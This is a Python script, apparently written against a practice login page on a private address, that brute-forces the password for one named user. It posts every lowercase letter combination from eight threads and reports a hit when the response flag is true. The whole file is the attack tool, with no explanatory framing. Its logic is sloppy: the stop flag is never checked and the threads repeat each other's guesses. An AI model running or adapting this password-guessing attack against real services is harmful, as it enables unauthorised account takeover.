from requests import put, get,delete,post
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

import itertools
import multiprocessing
from time import sleep, ctime
from multiprocessing import Process, Lock, Manager
from concurrent.futures import ThreadPoolExecutor
import threading

codebase_list = list(map(chr, range(ord('0'), ord('9') + 1))) + list(map(chr, range(ord('A'), ord('Z') + 1))) + list(map(chr, range(ord('a'), ord('z') + 1)))
codebase_list = list(map(chr, range(ord('a'), ord('z') + 1)))
BASE_URL = 'http://192.168.255.111/practice/login/'
flag = True
# 参数times用来模拟网络请求的时间

def get_html(num):
    global flag
    a_list =[ ]
    for i in range(num):
        a_list.append(codebase_list)
        for p in itertools.product(*a_list):
            # if flag:
            password = ''.join(p)
            print(password)
            data_json = {
            'username': 'liyubo',
            'password': password,
            }
            ret2 = post(BASE_URL, data=data_json)
            print(ret2.json())
            a = ret2.json()
            if a['flag']:
                print("is : %s" % password)
                flag = False


if __name__ == '__main__':
    p_list = []
    try:
        for i in range(8):
            thread1 = threading.Thread(target=get_html, args=(i,))
            thread1.setDaemon(True)
            thread1.start()
            # p = multiprocessing.Process(target=get_html, args=(i,))
            # p.daemon = True
            # p.start()
            #p_list.append(p)
    except InterruptedError:
        exit()
